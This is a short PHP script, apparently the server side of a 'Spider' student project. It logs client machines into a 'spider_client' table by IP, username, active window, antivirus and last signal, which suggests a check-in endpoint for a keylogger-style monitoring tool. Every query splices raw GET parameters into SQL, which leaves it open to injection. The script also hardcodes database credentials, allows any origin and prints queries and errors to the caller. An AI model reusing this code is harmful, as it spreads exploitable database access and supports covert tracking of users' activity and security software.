<?php

header('Content-Type: text/html');
header('Access-Control-Allow-Origin: *');
$db = mysql_connect('mysql1.alwaysdata.com', '106149_nibbler', 'password');
mysql_select_db('epitech-hub_nibbler', $db);
$sql = 'SELECT * FROM `epitech-hub_nibbler`.`spider_client` WHERE ip_addr = "' . $_GET['ip_addr'] . '"';
$req = mysql_query($sql) or die('SQL Error :<br>'.$sql.'<br>'.mysql_error());
$data = mysql_fetch_assoc($req);
if ($data['ip_addr'] == $_GET['ip_addr']) {
	$sql = "UPDATE `spider_client` SET `current_username`='".$_GET['username']."',`last_connection`='".time()."',`state`='1',`curent_window`='".$_GET['window']."',`last_signal_sent`='".$_GET['signal']."' WHERE ip_addr = '" . $_GET['ip_addr'] . "'";
	$req = mysql_query($sql) or die ('SQL Error : <br>'. $sql . '<br>' . mysql_error());
	$sql = 'SELECT * FROM spider_client WHERE ip_addr = "' . $_GET['ip_addr'] . '" ';
	$req = mysql_query($sql) or die('SQL Error :<br>'.$sql.'<br>'.mysql_error());
	$data = mysql_fetch_assoc($req);
} else {
	$sql = "INSERT INTO `epitech-hub_nibbler`.`spider_client` (`id`, `server_ip`, `ip_addr`, `current_username`, `last_connection`, `sessions_id`, `plateform`, `anti_virus`, 
		`state`, `curent_window`, `last_signal_sent`) 
		VALUES (NULL, '".$_GET['server']."', '".$_GET['ip_addr']."', '".$_GET['username']."', '".time()."', '".$_GET['session']."', '".$_GET['plateform']."', '"
		.$_GET['virus']."', '".$_GET['state']."', '".$_GET['window']."', '".$_GET['signal']."')";
	$req = mysql_query($sql) or die ('SQL Error : <br>'. $sql . '<br>' . mysql_error());
	$sql = 'SELECT * FROM spider_client ORDER BY id DESC';
	$req = mysql_query($sql) or die('SQL Error :<br>'.$sql.'<br>'.mysql_error());
	$data = mysql_fetch_assoc($req);
}
echo $data['id'];
mysql_close($db);
?>